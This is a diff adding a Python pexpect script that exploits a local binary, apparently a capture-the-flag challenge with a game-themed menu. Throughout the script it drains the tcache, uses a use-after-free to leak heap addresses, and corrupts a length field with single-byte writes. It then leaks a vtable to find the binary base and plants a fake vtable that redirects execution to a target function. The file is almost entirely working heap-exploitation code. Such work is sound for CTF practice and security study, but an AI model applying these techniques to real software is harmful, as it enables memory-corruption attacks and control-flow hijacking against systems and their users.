@@ -1,0 +1,142 @@
+import pexpect, re, struct, sys
+BIN='/mnt/data/pwn_extract/pwn'
+
+def p64(x): return struct.pack('<Q', x & ((1<<64)-1))
+def u64(b): return struct.unpack('<Q', b.ljust(8,b'\0'))[0]
+
+def parse_hex(out):
+    m=re.search(r':\s*((?:[0-9a-fA-F]{2}\s*)+)', out)
+    if not m:
+        print('PARSE FAIL',repr(out)); return b''
+    return bytes(int(t,16) for t in re.findall(r'[0-9a-fA-F]{2}',m.group(1)))
+
+class P:
+    def __init__(self, log=False):
+        self.p=pexpect.spawn(BIN, encoding='latin-1', timeout=5)
+        if log: self.p.logfile_read=sys.stdout
+    def sl(self,s): self.p.sendline(str(s))
+    def exp(self,p): self.p.expect(p)
+    def sla(self,p,s): self.exp(p); self.sl(s)
+    def grace(self): self.exp('grace>')
+    def arch(self): self.exp('Archive:')
+    def rites(self): self.exp('Rites:')
+    def init(self): self.sla('Name your Tarnished:','abc'); self.sla('Choose origin:','0'); self.grace()
+    def bind_first_heed(self):
+        self.sl(14); self.rites(); self.sl(1)
+        self.sla('rite name>','r0'); self.sla('region>','0'); self.sla('kind 0..7>','1')
+        self.rites(); self.sl(2); self.sla('rite id>','0')
+        self.rites(); self.sl(4); self.grace()
+    def ac(self,title,size,fill):
+        self.sl(13); self.arch(); self.sl(1)
+        self.sla('title>',title); self.sla('size>',str(size)); self.sla('fill byte>',str(fill))
+        self.arch(); self.sl(8); self.grace()
+    def aw(self,idx,off,data):
+        # split large writes to avoid possible line-length problems
+        CH=0x100
+        for pos in range(0,len(data),CH):
+            chunk=data[pos:pos+CH]
+            self.sl(13); self.arch(); self.sl(3)
+            self.sla('id>',str(idx)); self.sla('offset>',str(off+pos)); self.sla('hex>',chunk.hex())
+            self.arch(); self.sl(8); self.grace()
+    def ai(self,idx,cnt):
+        self.sl(13); self.arch(); self.sl(5)
+        self.sla('id>',str(idx)); self.sla('count>',str(cnt))
+        self.arch(); out=self.p.before
+        self.sl(8); self.grace(); return out
+    def heed(self):
+        self.sl(14); self.rites(); self.sl(2); self.sla('rite id>','0')
+        self.rites(); self.sl(4); self.grace()
+    def abandon(self):
+        self.sl(14); self.rites(); self.sl(3); self.sla('rite id>','0')
+
+def fake_nowrite():
+    f=bytearray(96)
+    f[0]=1; f[1]=0; f[2]=0
+    f[8:16]=p64(0); f[16:24]=p64(1) # pending, no write since len=0
+    f[40:48]=p64(0) # destructor guard
+    f[48:56]=p64(0); f[56:64]=p64(0)
+    return bytes(f)
+
+def fake_write(obj, off, val):
+    f=bytearray(96)
+    f[0]=1; f[1]=val; f[2]=0
+    f[8:16]=p64(off)
+    f[16:24]=p64(2)
+    f[32:40]=p64(0x12345678)
+    f[40:48]=p64(0)      # do not free target pointer in destructor
+    f[48:56]=p64(obj)
+    f[56:64]=p64(0x1000)
+    f[64:72]=b'WRITEOBJ'
+    return bytes(f)
+
+def main():
+    io=P(False)
+    io.init(); io.bind_first_heed()
+
+    # drain existing 0x70 tcache entries; a0 reuses the stale task chunk
+    for i in range(9): io.ac(f'a{i}',96,0x41+i)
+
+    # turn a0 into a harmless pending future and free it again; tcache fd now leaks obj>>12
+    io.aw(0,0,fake_nowrite())
+    io.heed()
+    data=parse_hex(io.ai(0,32))
+    heap_page=u64(data[:8])
+    obj=(heap_page<<12)+0xc0
+    print('[+] obj =',hex(obj))
+
+    # UAF single-byte writes: archive0.data.len 0x60 -> 0x400 at obj+0x1a8
+    for j,(off,val) in enumerate([(0x868,0x00),(0x869,0x04),(0x878,0x00),(0x879,0x04)]):
+        idx=9+j
+        io.ac(f'w{j}',96,0x55)
+        io.aw(idx,0,fake_write(obj,off,val))
+        io.heed()
+        print('[+] len byte',hex(off),'=',hex(val))
+
+    leak=parse_hex(io.ai(0,0x240))
+    vtable=u64(leak[0x90:0x98])
+    base=vtable-0x295fc8
+    champ=base+0x10d2f0
+    print('[+] vtable =',hex(vtable),'base =',hex(base),'champ =',hex(champ))
+    # print useful offsets
+    # for off in [0x70,0x88,0x90,0x148,0x150,0x1a8,0x1d0,0x1e8,0x1f0,0x200,0x208]: print(hex(off), leak[off:off+16].hex())
+
+    # Reallocate obj so fake vtable is not left inside tcache metadata.
+    io.ac('holder',96,0x66)  # data ptr == obj
+
+    payload=bytearray(0x300)
+    # fake vtable at obj: destructor = champion function, size/free flag = 0
+    payload[0:8]=p64(champ)
+    payload[8:16]=p64(0)
+
+    # rites entry begins at obj+0x70: prevent bad title free; task ptr=obj; vtable=obj
+    payload[0x70:0x78]=p64(0)       # rax==0 => skip free(title)
+    payload[0x78:0x80]=p64(0)
+    payload[0x88:0x90]=p64(obj)
+    payload[0x90:0x98]=p64(obj)
+
+    # fake state consumed by champion() with rdi=obj
+    payload[0x148:0x150]=p64(0)
+    payload[0x150:0x158]=p64(0)     # vector length 0 => skip loop
+    # state.name String at +0x1d0: {cap, ptr, len}; display fn uses +8/+0x10
+    name=b'Tarnished'
+    payload[0x1d0:0x1d8]=p64(len(name))
+    payload[0x1d8:0x1e0]=p64(obj+0x220)
+    payload[0x1e0:0x1e8]=p64(len(name))
+    payload[0x1e8:0x1f0]=p64(0)     # value printed later
+    payload[0x18d]=1
+    payload[0x191]=0
+    payload[0x1f0:0x1f8]=p64(0x454c44454e5f4c44) # b'DL_NELDE'
+    payload[0x200:0x208]=p64(0)
+    payload[0x208]=0
+    payload[0x220:0x220+len(name)]=name
+
+    io.aw(0,0,payload)
+    print('[+] trigger')
+    io.p.logfile_read=sys.stdout
+    io.abandon()
+    try:
+        io.p.expect(pexpect.EOF, timeout=3)
+    except Exception:
+        pass
+
+if __name__=='__main__': main()
